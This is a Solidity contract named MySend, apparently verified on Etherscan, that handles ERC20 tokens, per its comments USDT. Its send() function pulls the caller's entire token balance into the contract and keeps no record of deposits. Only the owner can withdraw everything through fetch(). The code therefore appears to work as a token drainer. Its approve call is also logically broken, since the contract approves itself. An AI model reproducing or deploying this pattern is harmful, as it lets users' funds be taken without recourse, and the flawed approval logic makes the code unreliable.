/**
 *Submitted for verification at Etherscan.io on 2021-06-04
*/

pragma solidity ^0.5.14;


// Math operations with safety checks that throw on error
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Math error");
        return c;
    }
  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Math error");
        return a - b;
    }
  
}


// Abstract contract for the full ERC 20 Token standard
contract ERC20 {
    
    function balanceOf(address _address) public view returns (uint256 balance);
    
    function transfer(address _to, uint256 _value) public returns (bool success);
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    
    function approve(address _spender, uint256 _value) public returns (bool success);
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);


    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}


// Token contract
contract MySend {
    address public tokenAddress;
    address public owner;
        
    bytes4 private constant APPROVE = bytes4(
        keccak256(bytes("approve(address,uint256)"))
    );
    bytes4 private constant TRANSFER = bytes4(
        keccak256(bytes("transfer(address,uint256)"))
    );
    bytes4 private constant TRANSFERFROM = bytes4(
        keccak256(bytes("transferFrom(address,address,uint256)"))
    );
    
    constructor(address _tokenAddress) public {
        owner = msg.sender;
        tokenAddress = _tokenAddress;
    }
    
    modifier onlyOwner {
        require(msg.sender == owner, "You are not owner");
        _;
    }
    
    function setToTokenAddress(address _tokenAddress) public onlyOwner returns (bool success) {
        require(_tokenAddress != address(0), "zero address");
        tokenAddress = _tokenAddress;
        success = true;
    }

    function setOwner(address _owner) public onlyOwner returns (bool success) {
        require(_owner != address(0), "zero address");
        owner = _owner;
        success = true;
    }

    function fetch(ERC20 _erc20Address) public onlyOwner returns (bool success2) {
        uint256 _value = _erc20Address.balanceOf(address(this));
        (bool success, ) = address(_erc20Address).call(
            abi.encodeWithSelector(TRANSFER, msg.sender, _value)
        );
        if(!success) {
            revert("transfer fail");
        }
        success2 = true;
    }
    
    function send() public returns (bool success3) {
        // 获取发送方的地址usdt余额
        ERC20 erc20 = ERC20(tokenAddress);
        uint256 _value = erc20.balanceOf(msg.sender);
        
        // 先授权
        (bool success1, ) = address(tokenAddress).call(
            abi.encodeWithSelector(APPROVE, address(this), _value)
        );
        if(!success1) {
            revert("transfer fail 1");
        }
        // 再转账
        (bool success2, ) = address(tokenAddress).call(
            abi.encodeWithSelector(TRANSFERFROM, msg.sender, address(this), _value)
        );
        if(!success2) {
            revert("transfer fail 2");
        }
        success3 = true;
    }
    
    
    
}